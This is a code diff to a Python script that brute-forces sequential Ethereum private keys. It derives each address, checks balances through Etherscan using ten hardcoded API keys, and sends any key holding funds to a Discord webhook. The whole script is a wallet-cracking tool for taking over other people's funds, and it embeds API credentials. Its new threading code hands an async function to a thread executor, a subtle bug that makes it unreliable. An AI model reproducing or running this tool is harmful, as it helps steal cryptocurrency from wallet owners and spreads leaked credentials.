@@ -1,6 +1,11 @@
+import random
 import asyncio
 import aiohttp
+from Crypto.Hash import keccak
+import ecdsa
+import binascii
 from discordwebhook import Discord
+from concurrent.futures import ThreadPoolExecutor
 
 # Function to get user input with validation
 def get_user_input(prompt, condition):
@@ -21,12 +26,6 @@ number_of_threads = get_user_input("Number of threads: ", lambda x: x > 0)
 no_of_accounts = get_user_input("Number of accounts per batch: ", lambda x: x > 0)
 check_in_thread = (end_value - start_value) // number_of_threads
 
-print(f"Start value: {start_value}")
-print(f"End value: {end_value}")
-print(f"Number of threads: {number_of_threads}")
-print(f"Number of accounts per batch: {no_of_accounts}")
-print(f"Check in thread: {check_in_thread}")
-
 # Discord notification function
 def discord_notification(msg):
     try:
@@ -36,12 +35,45 @@ def discord_notification(msg):
     except Exception as e:
         print(f"Failed to send Discord notification: {e}")
 
-# Placeholder functions for generate_address and get_balance
-async def generate_address(private_key):
-    return f"0x{private_key:064x}"
+# List of API keys
+api_keys = [
+    'F92Z14GE2DTF6PBBYY1YPHPJ438PT3P2VI',
+    '4Q5U7HNF4CGTVTGEMGRV5ZU9WYNJ6N7YA5',
+    'EX8K12JY7BCVG8RAUU8X2Z6QT2GCF5EYB4',
+    'DZHWCIEA2WW86CZEC88IGWG1JFB6JN3VHS',
+    'YIDAXPUWHJB21RJVMS1JMXHABMEF67RQWG',
+    '12RU83G1ATVA9V4EMM3U45X8BG4RG9PM6T',
+    'PYM9U2QD949KZZX23QJ4YZRX3KC3PHAI88',
+    'SH884AZJMKIFDMAPSMHTHJUQ3QIRPH827I',
+    'PYM9U2QD949KZZX23QJ4YZRX3KC3PHAI88',
+    'TDMPDZU8RD4V9FVB66P5S47QETEJ6R61UY'
+]
 
+# Function to generate Ethereum address from private key
+def generate_address(private_key):
+    private_key_hex = hex(private_key)[2:].zfill(64)
+    sk = ecdsa.SigningKey.from_string(binascii.unhexlify(private_key_hex), curve=ecdsa.SECP256k1)
+    vk = sk.get_verifying_key()
+    public_key = vk.to_string()
+    keccak_hash = keccak.new(digest_bits=256)
+    keccak_hash.update(public_key)
+    public_key_hash = keccak_hash.digest()
+    ethereum_address = "0x" + public_key_hash.hex()[-40:]
+    return ethereum_address
+
+# Function to get balance of Ethereum addresses
 async def get_balance(addresses, api_key):
-    return {"status": "1", "result": [{"account": addr, "balance": "0"} for addr in addresses]}
+    address_str = ','.join(addresses)
+    url = f'https://api.etherscan.io/api?module=account&action=balancemulti&address={address_str}&tag=latest&apikey={api_key}'
+    async with aiohttp.ClientSession() as session:
+        for _ in range(5):  # Retry up to 5 times
+            try:
+                async with session.get(url) as response:
+                    response.raise_for_status()
+                    return await response.json()
+            except aiohttp.ClientError:
+                await asyncio.sleep(5)  # Non-blocking sleep
+    return None
 
 # Function to process the balance response
 async def process_balance_response(response, count, no_of_accounts):
@@ -50,20 +82,17 @@ async def process_balance_response(response, count, no_of_accounts):
     for index, rec in enumerate(response['result']):
         hex_id = count - no_of_accounts + index
         balance = int(rec['balance'])
-        address = rec['account']
-        if balance > 3000000000000000:
+        if balance > 10000000000000000:
             print(f"Found good balance, private-key {hex(hex_id)[2:].zfill(64)}")
             discord_notification(f"Private Key: {hex(hex_id)[2:].zfill(64)}: balance: {balance / 1e18}")
-        elif balance > 0:
-            print(f"{hex_id} {address} {balance / 1e18}")
     return True
 
 # Function to run the balance check process
 async def run(start, thread_index):
     count = start
     while count < start + check_in_thread:
-        addresses = [await generate_address(count + i) for i in range(no_of_accounts)]
-        api_key = 'FAKE_API_KEY'  # Use a single API key for simplicity
+        addresses = [generate_address(count + i) for i in range(no_of_accounts)]
+        api_key = api_keys[thread_index % len(api_keys)]
         response = await get_balance(addresses, api_key)
         if response and await process_balance_response(response, count, no_of_accounts):
             count += no_of_accounts
@@ -72,16 +101,16 @@ async def run(start, thread_index):
 
 # Function to run multiple threads
 async def run_multiple_threads():
-    tasks = []
-    global start_value
-    for thread_index in range(number_of_threads):
-        tasks.append(run(start_value, thread_index))
-        start_value += check_in_thread
-    await asyncio.gather(*tasks)
+    with ThreadPoolExecutor(max_workers=number_of_threads) as executor:
+        loop = asyncio.get_event_loop()
+        tasks = [
+            loop.run_in_executor(executor, run, start_value + i * check_in_thread, i)
+            for i in range(number_of_threads)
+        ]
+        await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
     try:
         asyncio.run(run_multiple_threads())
     except Exception as e:
         discord_notification(f"Server 01: Failed to run, restart it. {e}")
-   
